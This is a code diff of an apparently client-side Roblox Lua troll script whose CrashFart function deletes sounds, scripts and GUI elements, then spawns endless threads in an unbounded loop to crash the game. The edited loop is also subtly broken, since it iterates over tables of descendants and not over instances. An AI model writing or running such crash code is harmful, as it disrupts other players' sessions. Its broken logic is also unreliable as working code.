@@ -16,7 +16,13 @@ local FartSounds = {
 }
 
 local function CrashFart()
-	for _,instance in ipairs(game:GetDescendants()) do if instance.ClassName == 'Sound' or instance.ClassName == 'Script' or instance.ClassName == 'LocalScript' or instance.ClassName == 'ScreenGui' then instance:Destroy() end end
+	local instanceTables = {
+		game.Players.LocalPlayer:GetDescendants(),
+		game.StarterGui:GetDescendants(),
+		game.StarterPlayer:GetDescendants(),
+		game.Workspace:GetDescendants(),
+	}
+	for _,instance in ipairs(instanceTables) do if instance.ClassName == 'Sound' or instance.ClassName == 'Script' or instance.ClassName == 'LocalScript' or instance.ClassName == 'ScreenGui' then instance:Destroy() end end
 	for i=1,math.huge do
 		task.spawn(function()
 			while true do
